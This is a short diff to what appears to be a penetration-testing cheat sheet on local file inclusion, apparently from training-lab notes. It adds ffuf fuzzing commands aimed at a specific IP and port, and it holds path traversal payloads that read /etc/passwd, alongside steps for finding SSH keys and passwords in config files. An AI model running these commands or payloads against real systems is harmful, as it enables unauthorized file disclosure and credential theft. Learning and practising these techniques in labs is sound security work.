@@ -2,6 +2,15 @@
 2. Search for SSH Keys
 3. Search for passwords in log or configuration files (.htaccess, config.php)
 
+```bash
+ffuf -w ~/opt/wordlists/burp-parameter-names.txt:FUZZ -u 'http://94.237.56.156:53371/index.php?FUZZ=value'
+
+ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.56.156:53371/index.php?page=FUZZ'
+
+ffuf -w ~/opt/wordlists/LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>/index.php?language=../../../../FUZZ'
+```
+
+
 ```http
 /../../../../../../../../../etc/passwd
 ../../../../../../../../../etc/passwd
